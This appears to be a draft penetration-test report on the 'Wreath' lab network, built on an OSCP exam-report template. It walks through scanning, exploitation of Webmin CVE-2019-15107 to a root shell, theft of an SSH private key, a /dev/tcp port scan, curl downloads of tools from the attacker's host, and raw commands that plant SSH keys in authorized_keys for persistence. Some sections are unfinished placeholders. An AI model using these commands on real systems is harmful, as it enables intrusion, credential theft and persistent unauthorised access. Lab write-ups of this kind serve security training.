---
title: "Offensive Security Certified Professional Exam Report"
author: ["blablabla@gmail.com", "OSID: 12345"]
date: "2023-09-07"
subject: "Markdown"
keywords: [Markdown, Example]
subtitle: "OSCP Exam Report"
lang: "en"
titlepage: true
titlepage-color: "1E90FF"
titlepage-text-color: "FFFAFA"
titlepage-rule-color: "FFFAFA"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
---

# Offensive Security OSCP Exam Report

# High-Level Summary

I was tasked to performing an internal penetration test towards componentes of a friend.

The porpuse of this task is to perform attacks similar to those of a hacker and attempt to infiltrate into the the hidden server.
My objective is to evaluathe the overall security of the network, identify assets and exploit existing flaws while reporting findings back to my friend.

The the following IP was provided by the friend as initial access to this accessment:
    - **10.200.105.200**

This first machine forwards the connection to a second machine, where a webserver has been hosted. 
In this network there is also a personal computer of the friend.

During this assessment we were able to access the server where the website is hosted by exploiting a kwown vulnerability of the webserver *MiniServ 1.890*. In this access, we discovered two other IPs within this network:

  - **10.200.105.200**
  - **10.200.105.250**

## Recommendations

<!-- write end up methodology -->


## Information Gathering

During the information gathering we collected the necessary informatiou to identify the scope of this assesment:
During this penetration test, I was tasked with exploiting the exam network.
The specific IP addresses were:

**Exam Network**

- **10.200.105.200**
- **10.200.105.200**
- **10.200.105.200**

# Findings / Issues

## Information disclosure - services and version
**Severity**
High
**Description**
By performing an network scanner, the server provides full information about the server and the services, like version and Operation System. This information allows attackers to exploit known vulnerabilities on the system:
|Port|Service|Version              |
|----|--------|--------------------|
|22   |ssh    |OpenSSH 8.0         |
|80   |http   |OApache httpd 2.4.37|
|443  |http   |OApache httpd 2.4.37|
|10000|http   |MiniServ 1.890      |

The scan also reveals tha the server is running the OS **Centos**. 
**Recommendation**
It is recommended to hide sensitive information, like versions and name of the services running, otherwise attackers can explore known vunerabilities.

## Information disclosure - Sensitive personal information
**Severity**
High
**Description**
The webside in the URL https://thomaswreath.thm/ discloses senstive personal information, like address, phone number and email address.
![Personal information disclosure in the website](Screenshot_2023-09-05_18-48-03.png)
**Recommendation**
It is recommended to avoid disclosing senstive personal information, since they may be use by attackers to perform impersonation and other kind of scams that uses existing identities. 

## Services with known vulnerability
**Severity**
Medium
**Description**
Through the network scan described below it was that the running services contains known vulnerabilities as shown below:
|Service|Version             |Vulnerability|
|-------|-----------------------|--------------------|
|ssh    |OpenSSH 8.0            |[CVE-2018-20685](https://www.cve.org/CVERecord?id=CVE-2018-20685),    [CVE-2019-6109](https://www.cve.org/CVERecord?id=CVE-2019-6109),     [CVE-2019-6110](https://www.cve.org/CVERecord?id=CVE-2019-6110),     [CVE-2019-6111](https://www.cve.org/CVERecord?id=CVE-2019-6111)     |
|http   |OApache httpd 2.4.37   | [CVE-2023-25690](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25690), [CVE-2019-0215](https://www.cve.org/CVERecord?id=CVE-2019-0215) |
|http   |MiniServ 1.890      | [CVE-2019-15107](https://www.cve.org/CVERecord?id=CVE-2019-15107) |
|OpenSSL |  OpenSSL/1.1.1c | [CVE-2023-3817](https://www.cve.org/CVERecord?id=CVE-2023-3817) |

Vulnerabilities:
- OpenSSH 8.0: exploitation available in the service SCP
- OApache httpd 2.4.37: HTTP request smuggling attack when certain conditionsare met
- MiniServ 1.890: Remote command execution in the parameter password_change.cgi
- OpenSSL/1.1.1c: Potential Denial of Service by the usage of some functions

**Recommendation**
It is highly recommended to patch existing sercices to its current. This prevents attackers from exploiting known vulnerabilities.

## Remote command execution on the webserver gives admininistrative privileges to the webserver
**Severity**
High
**Description**
Using the existing vulnerability of the service **MiniServ 1.890**, it is possible to perform remote code execution (RCE) and get administrative access to the server. 

To achiev this result, the the python script of the [CVE-2019-15107](https://github.com/MuirlandOracle/CVE-2019-15107) was executed as following:

```
CVE-2019-15107.py thomaswreath.thm -p 1000
```

The result of this command gave us access to the webserver and we could execute normal linux commands, like *hostname*, *ip a*. *whoami*:
```
# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:5a:e7:a1:7c:ad brd ff:ff:ff:ff:ff:ff
    inet 10.200.105.200/24 brd 10.200.105.255 scope global dynamic noprefixroute eth0
       valid_lft 2261sec preferred_lft 2261sec
    inet6 fe80::5a:e7ff:fea1:7cad/64 scope link 
       valid_lft forever preferred_lft forever
# whoami
root
# hostname
prod-serv
# https://
```
**Recommendation**
As described in the previous issue, it is recommended to keep services updated. Additionaly, all servers should run its services with minimal privileges as possible. In case an attacker can access the server, keeping minimal privileges prevent attackers from performing privilege escalation and other attacks that may affect the confidentiality, integrity and availability of the server, including scanning other hosts in the network not accessible through public interface.

Running services or command as *root* should be restricted to minimal essential tasks.

# Narrative

## Service Enumeration

### Network Enumeration
The first part of this assesment was dedicated to the enumeration of the provided IP Address **10.200.105.200**. This enumeration was performed using the network scanner nmap:

```
nmapAutomator.sh -H 10.200.105.200  -t full -o wreath
nmap -p- -Pn -sS 10.200.105.200 -oA wreathAllPorts

# nmap options
# -p-: all ports
# -Pn: no ping
# -sS: SYN scan (stealth to avoid detection)
# -oA: output
```

The results of this scan is listed below:
```
Not shown: 65380 filtered tcp ports (no-response), 150 filtered tcp ports (admin-prohibited)
PORT      STATE  SERVICE
22/tcp    open   ssh
80/tcp    open   http
443/tcp   open   https
9090/tcp  closed zeus-admin
10000/tcp open   snet-sensor-mgmt
```

The next scan was performed to detect the running services on the open ports:
```
nmap -p22,80,443,9090,10000 -A -Pn -sS 10.200.105.200 -oA wreathServices

# nmap options
# -p-: all ports
# -A: Version, OS detection, script scanning and traceoute
# -Pn: no ping
# -sS: SYN scan (stealth to avoid detection)
# -oA: output
```

The result of this scan is described below:
```
22/tcp    open   ssh        OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
80/tcp    open   http       Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_http-title: Did not follow redirect to https://thomaswreath.thm
443/tcp   open   ssl/http   Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_http-title: Thomas Wreath | Developer
| tls-alpn: 
|_  http/1.1
9090/tcp  closed zeus-admin
10000/tcp open   http       MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
|_http-server-header: MiniServ/1.890
```

### Website Enumeration
Opening the IP address, we are redirected to the following website:
- **https://thomaswreath.thm/**

With this address, we performed a directory discovery with the following command:
```
dirb https://thomaswreath.thm/*
```

This tool scanned the website for common directories name. The result of this scan is listed below:
```
https://thomaswreath.thm/img/
```
![Screenshot of one result of the directory fuzzing](Screenshot_2023-09-05_18-47-06.png)
To scan the webserver hosted in the ports 80 and 443, we also used the tool nikto and the following command:
```
nikto -h thomaswreath.thm -port 80,443 -output resultnikto.txt
```

## Exploiting known vulnerability
In this section, we exploited the vulnerability of the webserver **MiniServ 1.890 (Webmin httpd)**. For this task, we used the exploit available online [CVE-2019-15107](https://github.com/MuirlandOracle/CVE-2019-15107).

This exploit written in python allows automatic execution by performing the following command
```
CVE-2019-15107.py thomaswreath.thm -p 10000
```

As result of this command, we are able to penetrate on the server and execute commandos, as shown below:
```
# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:5a:e7:a1:7c:ad brd ff:ff:ff:ff:ff:ff
    inet 10.200.105.200/24 brd 10.200.105.255 scope global dynamic noprefixroute eth0
       valid_lft 2261sec preferred_lft 2261sec
    inet6 fe80::5a:e7ff:fea1:7cad/64 scope link 
       valid_lft forever preferred_lft forever
# whoami
root
# hostname
prod-serv
#
```

Since this access was with root user, it was not necessary to escalate privilege to root. This access allows us to see the configuration of the server and scan other hosts in this network.

After gaining this access, it was possible to create a reverse shell with the following command:
```
nc -lvnp 5556

# to stabilize this shell, the following commands were executed
python3 -c 'import pty;pty.spawn("/bin/bash")' 
export TERM=xterm
```
The result is a stabilized shell as shown above:
![Result](Screenshot_2023-09-05_21-23-15.png)

Accessing the folder */root/.ssh/id_rsa*, it was possible to access the private key to access the server through ssh and transfer it to the attacking machine.

## Pivoting and Accessing other Servers
With the access to server where the website is hosted, it is possible to perform another enumeration to discover what other endepoints exists withing the internal network.

Using the command below, it was possible to send ICMP packets to possible hosts on on the network:

```
for i in {1..255}; do (ping -c 1 10.200.105.${i} | grep "bytes from" &); done
```
As response, the command showed us that there is another IP on this network:
  - **10.200.105.250**

The following command allowed us to perform a port scanning on these to IPs to identify openned ports:

```
for i in {1..65535}; do (echo > /dev/tcp/10.200.105.250/$i) >/dev/null 2>&1 && echo $i is open; done
```

The result of this scanned showed us that the following ports are opnned on this host:
- 22
- 1337

Our access allowed us to transfer files between the our attacking machine and the compromised webserver. We used the following commands:
```
# Create a webserver on the attacking machine where the binaries are being hosted:
sudo python3 -m http.server 80

# From the comprimised server, we then fechted the desired files, in this case nmap and socat
curl ATTACKING_IP/path/to/file -o /tmp/path/to/file && chmod +x /tmp/path/to/file

curl 10.50.106.78/nmap -o /tmp/nmap-pat && chmod +x /tmp/nmap-pat
curl 10.50.106.78/nc -o /tmp/nc-pat && chmod +x /tmp/nc-pat 
curl 10.50.106.78/socat -o /tmp/socat-pat && chmod +x /tmp/socat-pat
```

The transfer binaries are *nmap* and *socat*. The first one to perform a network scanning and the second one to stablish contact with the hosts within the network. With *nmap*, it was possible to get result about the services running on the openned ports of the host **10.200.105.250**:

```
PORT     STATE SERVICE
22/tcp   open  ssh
1337/tcp open  menandmice-dns
```
sshuttle -R  pwned@172.16.20.7 172.16.0.0/16
--ssh-cmd "ssh -i priv_key"

chattr -i authorized_keys
cat screamz_rsa.pub >> authorized_keys
chattr +i authorized_keys

echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDQ8xgsTIkaOEh8q3t2YrWeJ+9sWfxrLrNgj+0x1AJ2aZ0r3jv6+o2vl3WFY1ge/hnjNIL8rfLXiCWmyJG32UgDgN9DQgtH5xGYyft7tnLktL9J+kFXl3/Aur4udXKpY6m+zT3OC53uj3yoF7nHNoKLGUTX3HG4pLqp9hLqO6li5YlrA7HUn2DwWF74DN/q/CuvThlV/jh6QP0SxDOAptfVl+WMU5PKFcI+L8JGHCieRMtS9i0Pu1nRkKBJvACN96yJJFOsFYffhuTL5OVnfPeh5WCqqFhXGyN39bEdq4kN/AeV1xC9qdzxOEaQ88ZkwZ5E4nEwDh8r4qRvMO0DvZPo7o3hAx/7QYfHwxvLOTNpd2EG+Nkrj8wGzAttdzmu6vgdOlA1TEunApvDineMOCSTfrDWIS525sVoyxaP05B6vBwrZEw0GDasx3oi6y1ZjlyRFTUYXuOn/mJGvSAR1h7tPRAkYe3iKK3EQ/RiAbwBZM+0OfTWOtq0/jbCJWEM/d0= pat" >> authorized_keys


echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHBJjUen5EgdhSbhLrxxz9FIBnzBqUu9D5PrLlH3ckTT bruno.macedoxxi@hotmail.com" >> authorized_keys

echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDQ8xgsTIkaOEh8q3t2YrWeJ+9sWfxrLrNgj+0x1AJ2aZ0r3jv6+o2vl3WFY1ge/hnjNIL8rfLXiCWmyJG32UgDgN9DQgtH5xGYyft7tnLktL9J+kFXl3/Aur4udXKpY6m+zT3OC53uj3yoF7nHNoKLGUTX3HG4pLqp9hLqO6li5YlrA7HUn2DwWF74DN/q/CuvThlV/jh6QP0SxDOAptfVl+WMU5PKFcI+L8JGHCieRMtS9i0Pu1nRkKBJvACN96yJJFOsFYffhuTL5OVnfPeh5WCqqFhXGyN39bEdq4kN/AeV1xC9qdzxOEaQ88ZkwZ5E4nEwDh8r4qRvMO0DvZPo7o3hAx/7QYfHwxvLOTNpd2EG+Nkrj8wGzAttdzmu6vgdOlA1TEunApvDineMOCSTfrDWIS525sVoyxaP05B6vBwrZEw0GDasx3oi6y1ZjlyRFTUYXuOn/mJGvSAR1h7tPRAkYe3iKK3EQ/RiAbwBZM+0OfTWOtq0/jbCJWEM/d0= pat" > pat.pub





## Maintaining Access

Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable.
The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again.
Many exploits may only be exploitable once and we may never be able to get back into a system after we have already performed the exploit.

## House Cleaning

The house cleaning portions of the assessment ensures that remnants of the penetration test are removed.
Often fragments of tools or user accounts are left on an organization's computer which can cause security issues down the road.
Ensuring that we are meticulous and no remnants of our penetration test are left over is important.

After collecting trophies from the exam network was completed, I removed all user accounts and passwords as well as the Meterpreter services installed on the system.
Offensive Security should not have to remove any user accounts or services from the system.

# Additional Items

## Appendix - Proof and Local Contents:

IP (Hostname) | Local.txt Contents | Proof.txt Contents
--------------|--------------------|-------------------
192.168.x.x   | hash_here          | hash_here
192.168.x.x   | hash_here          | hash_here
192.168.x.x   | hash_here          | hash_here
192.168.x.x   | hash_here          | hash_here
192.168.x.x   | hash_here          | hash_here

## Appendix - Metasploit/Meterpreter Usage

For the exam, I used my Metasploit/Meterpreter allowance on the following machine: `192.168.x.x`

## Appendix - Completed Buffer Overflow Code

```
code here
```